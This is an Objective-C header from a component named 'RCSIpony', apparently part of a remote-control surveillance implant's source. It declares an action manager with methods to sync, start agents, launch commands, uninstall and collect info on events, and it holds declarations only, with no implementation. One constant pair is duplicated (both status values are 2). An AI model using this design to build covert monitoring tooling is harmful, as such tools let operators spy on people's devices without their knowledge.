/*
 * RCSIpony - Actions
 *  Provides all the actions which should be trigger upon an Event
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 11/06/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#ifndef __RCSIActions_h__
#define __RCSIActions_h__

@interface RCSIActions : NSObject
{
  NSMutableArray *mActionsMessageQueue;
  NSMachPort     *notificationPort;

#define ACTION_MANAGER_RUNNING  0
#define ACTION_MANAGER_STOPPING 2
#define ACTION_MANAGER_STOPPED  2
  int             actionManagerStatus;
}

@property (readonly) NSMachPort *notificationPort;

+ (RCSIActions *)sharedInstance;

- (BOOL)actionSync: (NSMutableDictionary *)aConfiguration;
- (BOOL)actionAgent: (NSMutableDictionary *)aConfiguration start: (BOOL)aFlag;
- (BOOL)actionLaunchCommand: (NSMutableDictionary *)aConfiguration;
- (BOOL)actionUninstall: (NSMutableDictionary *)aConfiguration;
- (BOOL)actionInfo: (NSMutableDictionary *)aConfiguration;
- (void)start;
- (BOOL)stop;

@end

#endif
